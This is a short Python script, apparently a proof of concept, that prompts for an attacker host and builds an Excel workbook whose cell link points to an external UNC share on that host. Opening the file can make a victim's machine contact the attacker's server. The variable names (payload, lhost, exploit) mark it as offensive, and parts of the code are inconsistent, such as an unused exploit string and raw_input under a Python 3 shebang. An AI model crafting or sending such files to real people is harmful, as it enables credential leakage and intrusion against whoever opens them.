#!/usr/bin/python3

payload = "'A01"
lhost = raw_input("enter value:")
exploit = lhost+payload

import xlsxwriter

workbook = xlsxwriter.Workbook('crap.xlsx')
worksheet = workbook.add_worksheet()

worksheet.write_url('W1', "external://"+lhost+"\share\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")

workbook.close()
